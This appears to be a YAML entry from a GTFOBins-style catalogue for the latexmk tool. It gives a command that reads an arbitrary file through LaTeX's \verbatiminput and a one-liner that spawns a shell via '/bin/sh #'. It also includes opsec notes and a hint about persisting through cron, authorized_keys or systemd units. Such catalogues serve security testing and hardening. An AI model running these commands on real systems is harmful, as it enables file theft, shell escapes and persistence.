---
name: latexmk
capabilities:
- exec
- spawn
- read
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: |-
    echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file
    latexmk -dvi /path/to/temp-file
    strings temp-file.dvi
  notes: The read file will be part of the output.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: 'latexmk -pdf -pdflatex=''/bin/sh #'' /dev/null'
references:
- https://gtfobins.github.io/gtfobins/latexmk/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
